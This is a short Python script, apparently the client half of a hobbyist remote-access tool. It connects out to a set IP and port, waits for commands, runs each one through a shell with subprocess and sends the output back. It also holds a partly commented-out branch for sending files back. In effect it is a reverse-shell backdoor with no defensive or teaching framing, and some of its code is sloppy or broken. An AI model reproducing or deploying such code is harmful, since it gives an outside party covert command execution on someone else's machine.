#clint 

import socket
import subprocess
from sys import stderr, stdout

ip = '0.0.0.0' #//change this to server given ip
port = 23  #//change this to server given port

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((ip,port))
print(f"Get connected to {ip}")
# response = s.recv(1024)
# print(response.decode())
# s.send(b"from clint")
# print("data send")

while (True):
    commendrecv = s.recv(1024)
    commendsplit = commendrecv.decode().split()
    commend0 = str(commendsplit[0]) 
    print(commendsplit)
    try:
        print(commendsplit[1])
        downItm = str(commendsplit[1])
        print(downItm)
    except:
        pass
    if commend0 == "EXIT":
        s.send("Exited")
        s.close()
        break
    elif commend0 == "download":
        # try:
        print(f"code run for ")
            # with open(downItm,'rb') as f:
                
            #     file = f.read()
            # s.send(file.encode())
        # except:
        #     print("file not found ")


    else:
        proc = subprocess.Popen(commend0,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output = proc.stdout.read()+proc.stderr.read()
        s.send(output)